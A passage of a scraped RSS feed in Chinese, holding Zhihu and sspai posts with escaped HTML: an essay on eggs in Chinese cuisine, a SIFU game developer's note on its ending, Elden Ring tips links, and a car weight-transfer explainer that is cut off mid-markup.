data-pid=\"irjPDgxU\">No<b>.</b>3 叁</p>\n<p data-pid=\"PH1smyo3\">唐以后，中国经济重心逐渐南移。这与黄河频繁的泛滥有关，与三国以来长达700多年的南方大开发也有关。原本代表了野蛮不服管的山越、南蛮之地，逐渐变成了山水婉约的江南佳丽地、岭南富饶乡。大米，成了人们餐桌上越来越重要的主食。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a1b1317a652cccfad1bf53ce5bc7d6a6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"613\" data-rawheight=\"568\" data-watermark=\"watermark\" data-original-src=\"v2-a1b1317a652cccfad1bf53ce5bc7d6a6\" data-watermark-src=\"v2-26f180ee2f6a8f6f22bec4ce1a8e0ecc\" data-private-watermark-src=\"v2-4bcec0ee8fae7a7521ce9c33de387d91\"></p>\n<p><br></p>\n<p data-pid=\"-ZkjezV4\">而在北方，日益严重的缺水、荒漠化，让耐寒、耐旱的小麦有了用武之地。中国今天“南米北面”的饮食结构逐渐形成。但这种饮食分歧的鸿沟上，却由鸡蛋架起一座沟通的虹桥：无论是米还是面，鸡蛋的参与，从来没有障碍。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5d8b6138ad478d5268c46c3baa441b13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-5d8b6138ad478d5268c46c3baa441b13\" data-watermark-src=\"v2-50114fd5509cfc40fd5bfbb91bc20365\" data-private-watermark-src=\"v2-f447eb0c493f03d97865abf77f67a038\"></p>\n<p><br></p>\n<p data-pid=\"91-MW9hl\">比如山东的鸡蛋灌饼、天津的煎饼馃子、陕西的鸡蛋馍花、河南的鸡蛋锅贴、浙江的鸡子馃、广东的鸡蛋仔……鸡蛋与面粉的混合，天然能提高面食里的蛋白质含量，增加小麦制品的嚼劲；在烹饪的过程中，鸡蛋遇热转性，散发香味，与面食的麦香形成混合互补，如果能有一点食用油在其中权衡勾兑，便成就了人人爱吃的各种面食。<b>而一碗卧着煎鸡蛋的面条，则是不论地域、不分物产，几乎所有地方的中国人，遇上生日时最好的犒劳。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-22a85ecd0ad30f992cb7eaf367692991_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1542\" data-watermark=\"watermark\" data-original-src=\"v2-22a85ecd0ad30f992cb7eaf367692991\" data-watermark-src=\"v2-6fbe96ff3b6fd4337ea59e1bda1136ba\" data-private-watermark-src=\"v2-edbeda5bb7abba57b487c563b5c190e8\"></p>\n<p><br></p>\n<p data-pid=\"z37LjS_j\">它们是中国面食世界的忠实诠释者。而在米食地区，鸡蛋被当成馅料，参与到各种米制品的制作里，成为各种鸡蛋团子、鸡蛋粿之外，它还能与大米一同炒制，这就是美食江湖中，最深藏不露的扫地僧——炒饭。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e39365842d6d13ac8598188e5b4e0f08_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"476\" data-rawheight=\"715\" data-watermark=\"watermark\" data-original-src=\"v2-e39365842d6d13ac8598188e5b4e0f08\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"_5iHAF20\">对厨子来说，炒饭是考教功力的试卷，选择食材、打磨根骨、掌控火候、一气呵成。看似简单，但每一步都是庖厨生涯的修为见证。对食客来说，炒饭则是证明见识和阅历的字典，虽然配料和做法千变万化。但有经验的食客，总会去芜存菁、拨开繁复的表象，洞见炒饭制作者的幽微用心和炒饭滋味的高下。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-af02a5792dca18fe6ed76effbbb9df1c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"1005\" data-watermark=\"watermark\" data-original-src=\"v2-af02a5792dca18fe6ed76effbbb9df1c\" data-watermark-src=\"v2-9234bb6c8a07e41338fa0da7d957494a\" data-private-watermark-src=\"v2-39acd42aa6bb88028cd5403578c5ce82\"></p>\n<p><br></p>\n<p data-pid=\"gmceTp5T\">而对食物本身来说，炒饭则符合中国饮食因地制宜，丰俭由人的传统：<b>在鸡蛋、米饭、葱花所构成的朴素根基上，搭载了由肉禽、河鲜、海味、蔬菜、块根所组成的无比宏伟的味觉殿堂。</b>无论是干香松软、配料丰富的扬州炒饭，是酱汁浓郁入味，鲜美入魂的福建炒饭；还是配料复杂、又咸又辣的贵州怪噜饭；又或者是代表了广式风味的咸鱼鸡粒炒饭、菠萝炒饭、生炒糯米饭、蛇血炒饭、炣饭……鸡蛋，都是隐藏其后的真正主角。炒饭的江湖很大，但没有鸡蛋，江湖永远都不是真正的江湖。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-23084628117b0fcf2ee06f1b3337bb43_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-23084628117b0fcf2ee06f1b3337bb43\" data-watermark-src=\"v2-73fe65927dc3531632c2af9b3bf80b1a\" data-private-watermark-src=\"v2-2652e41fb5951881adab764c018fd1d6\"></p>\n<p><br></p>\n<p data-pid=\"Ak6UNeC0\">No<b>.4</b> 肆</p>\n<p data-pid=\"ZD8GI53v\">十六世纪开始，大航海逐渐影响中国。古老的东方大陆，不可避免地参与到了世界物种大交换中。很多重要食材，由此进入中餐谱系：比如番茄。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-61b3cf6f409b70c49c6530cea1d61739_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"225\" data-watermark=\"watermark\" data-original-src=\"v2-61b3cf6f409b70c49c6530cea1d61739\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"mfRhWtpo\">新鲜番茄里富含大量谷氨酸，当受热并遇到钠盐的时候，就会络合成谷氨酸钠——也就是我们今天常说的味精。有趣的是，鸡蛋里含有大量丙氨酸、精氨酸、赖氨酸、丝氨酸等氨基酸。在钠盐的作用下，它们会形成各式各样的氨基酸盐。它们会与番茄形成的谷氨酸钠发生协同作用，让鲜味成倍放大。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bca7b5dc1b8d76bd5a4e6a48c601a0d5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"564\" data-rawheight=\"846\" data-watermark=\"watermark\" data-original-src=\"v2-bca7b5dc1b8d76bd5a4e6a48c601a0d5\" data-watermark-src=\"v2-c7732e5b8093f3f10a1c9ab04a5da8b0\" data-private-watermark-src=\"v2-febcde552d380a87cd68771c882db075\"></p>\n<p><br></p>\n<p data-pid=\"hWH9x5I5\">这是味精中添加各种呈味核苷酸后，制造蔬之鲜、鸡精等调味品的基本化学逻辑。是的，番茄、鸡蛋、盐、油，四种最基本食材构成的中华国民菜：西红柿鸡蛋，是真正的人造鲜味剂。它除了是一道最普通、最受欢迎的国民级家常菜之外，还常常被作为面条的浇料、夹馍的馅儿、米饭的添头和煮汤的引子。<b>原因无他，番茄鸡蛋实在是太鲜了，这种天然味精，被用到任何中餐烹饪的角落里，都能无往不利。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-70f7185db47f41ef171dd2dd84209c08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1544\" data-watermark=\"watermark\" data-original-src=\"v2-70f7185db47f41ef171dd2dd84209c08\" data-watermark-src=\"v2-435d34735caae9c7c9c2148cee085798\" data-private-watermark-src=\"v2-522dec994e000bbe3ef48414f941dab5\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"j2s33ZTE\"><b><i>-END-</i></b></p>\n<p><br></p>\n<p data-pid=\"UMV7asVw\">抗战时期，梁思成林徽因夫妇为保护战火下的古建筑而奔走四方。</p>\n<p data-pid=\"Er1y-UvO\">长期的操劳让林徽因的肺病恶化。为了补身体，梁思成每天早上为她煮一个鸡蛋。对煮蛋这件事，理科男梁思成的经验是：煮三分钟的鸡蛋最好吃，五分钟的鸡蛋营养最好。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-93591be453c482a0fe96d81c15f06607_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"403\" data-watermark=\"watermark\" data-original-src=\"v2-93591be453c482a0fe96d81c15f06607\" data-watermark-src=\"v2-c7dbe3f280b1b445df66b24b57f8bf33\" data-private-watermark-src=\"v2-4409801691e47830b469b77ff02bd9b7\"></p>\n<p><br></p>\n<p data-pid=\"F4n6z2fD\">美味和营养所包含的各种变量，当然没有梁思成说得那么简单。但一枚鸡蛋反映的梁林夫妇以小搏大、化繁为简的勇气和智慧，却很能代表那个忍辱负重年代里，中国知识分子的精神面貌：</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-69567363efa17642c29a4c65dbaf4a9d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"400\" data-rawheight=\"545\" data-watermark=\"watermark\" data-original-src=\"v2-69567363efa17642c29a4c65dbaf4a9d\" data-watermark-src=\"v2-f9ab74492769dae325af63ffcb0b62f0\" data-private-watermark-src=\"v2-b4e333096c88e8158da47c810a637059\"></p>\n<p><br></p>\n<p data-pid=\"KEsYm0o1\">他们如餐桌上的鸡蛋一样，外表是素朴的平民装扮，内里则藏着洞若观火的曼妙口感，和气象万千的大乘滋味。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c9efa42b46e8ee78f2594f4206483af3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1528\" data-watermark=\"watermark\" data-original-src=\"v2-c9efa42b46e8ee78f2594f4206483af3\" data-watermark-src=\"v2-9164191ff99a1ef2505f19e89efeca31\" data-private-watermark-src=\"v2-fbcee689b11e9dc4c939e644bd461cf1\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wei-shui-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">魏水华</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/288273712/answer/2368304645?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">13 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/508884267?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">关于鸡蛋有哪些不同吃法？哪种吃法最有营养？</a><br><a href=\"http://www.zhihu.com/question/471078500?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">苹果和鸡蛋可以做成什么美食？</a><br>\n","link":"http://www.zhihu.com/question/288273712/answer/2368304645?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"派评 | 近期值得关注的 App","date":"2022-02-28 09:23:52","description":"你可以通过文章目录快速跳转到你感兴趣的内容。如果发现了其它感兴趣的 App 或者关注的话题，也欢迎在评论区和我们进行讨论。<a href=\"https://sspai.com/post/71749\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71749"},{"title":"想要开启自己创作之旅？这份写作建议为你助力","date":"2022-02-28 09:00:16","description":"希望这份《给少数派的写作建议》，能陪你开启创作之旅。<a href=\"https://sspai.com/post/71724\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71724"},{"title":"如何评价游戏《SIFU》（师父）的结局？","date":"2022-02-28 08:25:11","description":"\n<p data-pid=\"_aHKkwiU\">大家好，我们是《师父》的开发团队Slocap，出于对中国功夫与中华文化的敬意与热爱，我们团队用心创作了《师父》这款游戏，真诚地希望你们能够喜欢！我们也将认真听取你们的反馈，尽最大努力改进游戏！ </p>\n<p data-pid=\"3Vphr99Q\">《师父》是一款以中国风作为设计主题、中国城市作为游戏背景、中国功夫白眉拳作为基础战斗风格的动作冒险游戏。玩家将扮演一位踏上复仇之路的功夫学徒，独自一人闯入危机四伏的现代江湖。 我们渴望创造出一场真正具有沉浸感的中国功夫之旅。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e8a97b6bf25ed497ea293994deb50564_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2264\" data-rawheight=\"1279\" data-watermark=\"original\" data-original-src=\"v2-e8a97b6bf25ed497ea293994deb50564\" data-watermark-src=\"v2-76be7a2d20171332fab8b41f28ee5f52\" data-private-watermark-src=\"v2-8195443f35bcc8c1c588c95eaa32178d\"></p>\n<p data-pid=\"rGPJ-84r\">复仇，是这款游戏的主题，也是主角潜心磨练，踏上征途的理由。 </p>\n<p data-pid=\"RTLY9Vdu\">主角在五个关卡的终点，需要面对的正是曾经的五个仇人——反目成仇，五个最熟悉的陌生人。 </p>\n<p data-pid=\"jzbL7QeZ\">不仅是背叛者，而且还是弑父的凶手。在中国的古书《礼记》中有一句话是：“父之仇，弗与共戴天。” </p>\n<p data-pid=\"5aJubEX7\">习武复仇，天经地义。 </p>\n<p data-pid=\"LLEbOCF-\">主角需要孤身一人，依靠自己独特的功夫，穿越城市的隐蔽角落，猎杀所有敌人，并最终杀死每一个凶手，以告慰先父在天的亡灵。 </p>\n<p data-pid=\"dNrotmOd\">这就是《师父》这款游戏的结局。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c2ef303ae8d0e4590d490685bb4d94db_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-c2ef303ae8d0e4590d490685bb4d94db\" data-watermark-src=\"v2-43d7cf2cd13e7d10a5cb0fb7aca5b689\" data-private-watermark-src=\"v2-0d3dc3b32c081dcfe35c24cde67f4e05\"></p>\n<p data-pid=\"W2Idk6tE\">但是，中华文化又是如此博大精深、耐人寻味，中国的古语曾说：“以德报怨”、“冤冤相报何时了”；中华功夫不仅在于技艺的精湛，而且在于“武德”的追寻，老师父会教导自己的弟子说：“习武，是为了止戈。” </p>\n<p data-pid=\"u1Zm4F2w\">就像游戏中的师父曾说的：“武艺高超，武德充沛之人，会令对手知难而退，不战而屈人之兵。” </p>\n<p data-pid=\"JoER-vYS\"><b>复仇是一个永无止境的循环，真正的强者会让恨意止于己身。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-384f91fd6f8ef8b0bd8639e05379b90b_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-384f91fd6f8ef8b0bd8639e05379b90b\" data-watermark-src=\"v2-2914d8b94be9f55e70263af1d44e2504\" data-private-watermark-src=\"v2-d6a305b0b1ebd132cf4fc083d9cbb61c\"></p>\n<p data-pid=\"VLtYlo_j\">怀着对中华功夫更深层次的理解，我们为游戏设计了一个隐藏结局：如果你能找到一种方法来实现正义，并且始终忠于武德的价值观...你也许能够打破这个循环，玩家可以根据自己的理解在游戏中尝试并探索更多的可能——我们认为，领悟了其中的真谛，才能真正登上武学的山巅、进入更高的境界。 </p>\n<p data-pid=\"GZ8hHeZd\"><b>当然，无论如何——选择的权利，一定在玩家手里。</b> </p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/shi-fu-sifu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">师父SIFU</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/516125655/answer/2367773891?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">21 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/405611732?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么评价魂系游戏？</a><br><a href=\"http://www.zhihu.com/question/447829744?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">只狼里的小兵为什么看见我就砍，我这没招儿他们啊，这点在游戏里有什么解释吗？</a><br>\n","link":"http://www.zhihu.com/question/516125655/answer/2367773891?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"年度征文 | 我是如何艰难地克服「效率成瘾」的？","date":"2022-02-28 07:21:17","description":"陷入「效率成瘾」的境地之后，我开始为自己寻找药方。<a href=\"https://sspai.com/post/71518\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71518"},{"title":"游戏《艾尔登法环》有哪些技巧？","date":"2022-02-28 07:01:41","description":"\n<p data-pid=\"IJa92BY-\">下面两个视频和大家分享一下游戏中首先要做的事情和一些小技巧：</p>\n<p data-pid=\"8PpEUD3g\">1.《艾尔登法环》中首先要做的11件事，就和之前的《黑暗之魂》一样，《艾尔登法环》中也藏着各种各样的秘密以及让人永生难忘的战斗。虽然本作的乐趣在于探索，但在游戏初期多下点功夫，可以在以后省去很多麻烦。为此，我们给各位总结出来在《艾尔登法环》中优先级最高的11件事。</p>\n<a href=\"https://www.zhihu.com/zvideo/1481000705880711168\">【IGN】《艾尔登法环》中首先要做的11件事</a><p data-pid=\"ZSTja2-0\">2.   《艾尔登法环》没有告诉你的15件事。尽管《艾尔登法环》的教学内容比起前作来得更加细致，但游戏还是把一些重要的门门道道藏了起来，例如，你起码得玩上一个小时才能搞明白要怎么进行升级。所以今天我们就将为你揭秘15条《艾尔登法环》没有告诉你的小技巧。</p>\n<a href=\"https://www.zhihu.com/zvideo/1481001568951001088\">【IGN】《艾尔登法环》没有告诉你的15件事</a>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ignzhong-guo?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">IGN中国</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/518456865/answer/2367584543?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">13 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/65656796?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么游戏成了知乎的绝对政治正确？</a><br><a href=\"http://www.zhihu.com/question/68680474?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">知乎游戏区有哪些值得关注的优秀回答者？</a><br>\n","link":"http://www.zhihu.com/question/518456865/answer/2367584543?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"互联网反垄断怎么就变热了？——与反垄断律师对谈","date":"2022-02-28 06:24:08","description":"Matrix首页推荐Matrix是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选Matrix最优质的文章，展示来自用户的最真实的体验和观点。文章代表作者个人观点 ...<a href=\"https://sspai.com/post/71738\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71738"},{"title":"为什么有的赛车起步时会翘车头？","date":"2022-02-28 03:59:28","description":"\n<p></p>\n<a href=\"https://www.zhihu.com/video/1481347751128141824\">汽车为什么会抬头点头</a><p data-pid=\"W8OxXxT4\">这里是视频版，习惯看视频的可以看这个</p>\n<p data-pid=\"rueVdc9Q\">以下为图文版</p>\n<p data-pid=\"-Cuhc8HN\">写这个内容是因为看到一个问题：<br><i>为什么我是前驱车，地板油还会抬头？</i></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7b6535374f039746df0df38b7cfc37ee_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"636\" data-rawheight=\"270\" data-watermark=\"watermark\" data-original-src=\"v2-7b6535374f039746df0df38b7cfc37ee\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"FM5V5wzb\">由此想到的这可能是一个主观观测上的偏差（误会）<br>及衍生想到的：</p>\n<ul>\n<li data-pid=\"ZWg1Fn6U\">汽车抬头点头产生的原因</li>\n<li data-pid=\"WRoDwYh-\">几个关键要素</li>\n<li data-pid=\"hlNQ0IQq\">会对汽车性能有什么样的影响</li>\n</ul>\n<h2>1.一个误会</h2>\n<p data-pid=\"7ed40-05\">为什么很有可能是一个误会。<br>因为理论上来讲，不管是前驱车还是后驱车：<b>只要有一定的加/减速度，都会产生一定程度的抬头/点头现象。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-77b4cac5170e8b63902650e36a81abac_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"900\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-77b4cac5170e8b63902650e36a81abac\" data-watermark-src=\"v2-fc6efdeb41a59798c200fd83d8db003c\" data-private-watermark-src=\"v2-9985fddccf250c514aceddc7664c0f6e\"></p>\n<p><br></p>\n<p data-pid=\"bj0YEASb\">而为什么会产生前驱车抬头这么让人在意呢？<br>以下是我臆测的原因，仅供参考或者仅供看着您一乐啊。<br></p>\n<blockquote data-pid=\"MeMAM8qN\">很有可能是因为，前驱车加速时抬头的时间更长而引起你的关注了。</blockquote>\n<p data-pid=\"_AGx-3an\">为什么前驱车的抬头时间会更长，因为抬头了轴荷向后轴转移了。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c0ba4f2ef393c43317111d482adff61a_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"250\" data-watermark=\"watermark\" data-original-src=\"v2-c0ba4f2ef393c43317111d482adff61a\" data-watermark-src=\"v2-150e223cb1ae41444976aab8bb7c2aab\" data-private-watermark-src=\"v2-1962b9b7acbb9f7b17e7b60d46bf6d15\"></p>\n<p><br></p>\n<p data-pid=\"bGak1wqo\">这样前轴的轴荷就小了，摩擦力就小了，加速能力就差了。<br>这样，<b>前轮抬着头打滑的时间就长了，就更容易被驾驶者注意到了。</b><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e7068f0436383a34c59b40f4cfa5ac48_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1028\" data-rawheight=\"590\" data-watermark=\"watermark\" data-original-src=\"v2-e7068f0436383a34c59b40f4cfa5ac48\" data-watermark-src=\"v2-04e6d2102164bfc301c356835ade3802\" data-private-watermark-src=\"v2-6d88b1ba3175ae6667895786e81d3d4c\"></p>\n<p><br></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-feb5903a0f688ad84a47b1a38b29aa6b_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"989\" data-rawheight=\"416\" data-watermark=\"watermark\" data-original-src=\"v2-feb5903a0f688ad84a47b1a38b29aa6b\" data-watermark-src=\"v2-7778e7619263c25d39f3a8d6702e7429\" data-private-watermark-src=\"v2-5b2b4ca5508ac39ff9e84cee5062f4d2\"></p>\n<p><br></p>\n<p data-pid=\"bX8f23Co\">而后驱的就刚好相反，抬头是抬头了。<br>但是抬头了以后刚好轴荷向后轴转移了，<br>这样后轴的轴荷就大了啊，摩擦力就大了啊，加速能力就起来了啊。<br>这样，<b>哪怕抬头了，车子一下子就蹿出去了，轴荷很快就向平衡收敛了，驾驶者也就不会太在意那么一瞬的抬头了</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a157b90f2666fae5050913fdd082e63d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1079\" data-rawheight=\"621\" data-watermark=\"watermark\" data-original-src=\"v2-a157b90f2666fae5050913fdd082e63d\" data-watermark-src=\"v2-a57b23a17c2495d0218f4984ac15b764\" data-private-watermark-src=\"v2-ec1324832564ac085dfa2017d4c3fec8\"></p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e2afbf290c1389d43d525dc5869a5e0a_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"981\" data-rawheight=\"411\" data-watermark=\"watermark\" data-original-src=\"v2-e2afbf290c1389d43d525dc5869a5e0a\" data-watermark-src=\"v2-2d46088d5e4d8798ae53d8cf9ace708c\" data-private-watermark-src=\"v2-1f3aa1d8ba9057c96557005a14885581\"></p>\n<p><br></p>\n<p data-pid=\"r9gnPAWm\">好了，误会解释了。</p>\n<p data-pid=\"t9XlchU5\">前驱车很有可能就是因为台词太多了，而被注意到的。<br></p>\n<p data-pid=\"OLrV8667\">我们来看看汽车的抬头与点头是怎么产生的</p>\n<h2>2.一切都来自于对重量的乾坤大挪移</h2>\n<p data-pid=\"oOk7FZhx\">汽车虽然可以看做是一个相对庞大的箱体，但它是有一个重量的中心位置的，<b>称之为重心或质心</b>。<br>在汽车发生运动时，是以质心为中心运动的。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-63142f023756b9c1a258d91afdc97f87_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"608\" data-watermark=\"watermark\" data-original-src=\"v2-63142f023756b9c1a258d91afdc97f87\" data-watermark-src=\"v2-041440f9be78e214b648f791aecd6d57\" data-private-watermark-src=\"v2-fffbb0c23111f0d3f31293d77a951c03\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"TzcajaNz\">而车辆会抬头/点头，是因为车轮把重量往前/后搬，而搬的时候用的力又并不是作用在重心位置上的。<br>这个作用力一般是轮胎与地面的摩擦力提供的。<br>所以，一般来说这个力位置都是要比重心位置低的。<b>除非重心高度为零</b><br></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-69ca443ffae9355b42f5ba6958b0aa98_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"824\" data-watermark=\"watermark\" data-original-src=\"v2-69ca443ffae9355b42f5ba6958b0aa98\" data-watermark-src=\"v2-48d04651f2a6f375de178a2cd750a70e\" data-private-watermark-src=\"v2-1e30f066e9cb460ab12f67de987aa6d4\"></p>\n<p><br></p>\n<p><br></p>\n<p data-pid=\"IV04MnJd\">这样：<br>加速的时候，就会形成一个顺时针的力矩，这时车辆就抬头了。<br>减速的时候，就会形成一个逆时针的力矩，这时车辆就点头了。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7d85d148e1393c0c5fdb1a8503efca60_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"994\" data-rawheight=\"1193\" data-watermark=\"watermark\" data-original-src=\"v2-7d85d148e1393c0c5fdb1a8503efca60\" data-watermark-src=\"v2-d63c19ad51fc0af30a9da37d02ddfd9e\" data-private-watermark-src=\"v2-a5b3d1cfc44e5fbec4cb102aa096b10e\"></p>\n<p><br></p>\n<p data-pid=\"VtoVp7rD\">所以基本结论就是：<br><b>加减速时的作用力没有在重心位置上</b><br><b>导致汽车这个箱体围绕重心产生的回转</b><br><b>而正转反转看是加速还是刹车</b></p>\n<p data-pid=\"bY_hfsAU\">所以，把它称做：</p>\n<blockquote data-pid=\"CUgJe051\">一切都来自于对重量的乾坤大挪移</blockquote>\n<h2>3.大挪移几个关键要素</h2>\n<p data-pid=\"F8VaQ3y7\">前面说过：<i>只要有一定的加/减速度，都会产生一定程度的抬头/点头现象。</i></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7645245f92f5092c2ffd199bf39cf856_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"291\" data-watermark=\"watermark\" data-original-src=\"v2-7645245f92f5092c2ffd199bf39cf856\" data-watermark-src=\"v2-28640b329658654216d5ee04a8029b82\" data-private-watermark-src=\"v2-34effe7ba475dcb3de98e4efb57d4629\"></p>\n<p><br></p>\n<h3>而这个现象到底多大，是又什么决定的呢？</h3>\n<p data-pid=\"W96KGcuF\">多大主要看两个点：<br>一是轴荷转移有多少（负荷），二是弹簧有多硬（抵抗）<br>负荷减去抵抗就是车辆实际的点头/抬头的幅度</p>\n<p data-pid=\"0wta0V_z\">先看轴荷转移的多少，这会略为复杂。<br>我们可以看下这张图片，是以刹车为例说明轴荷转移的各种变量之间的关系。<br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5ab572d73a1c98024858419950114ed6_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1077\" data-watermark=\"watermark\" data-original-src=\"v2-5ab572d73a1c98024858419950114ed6\" data-watermark-src=\"v2-bcbc71cad7413fc57536c3f56dda5d97\" data-private-watermark-src=\"v2-46bfd649db253b1e2f98276514028bf0\"></p>\n<p><br></p>\n<p 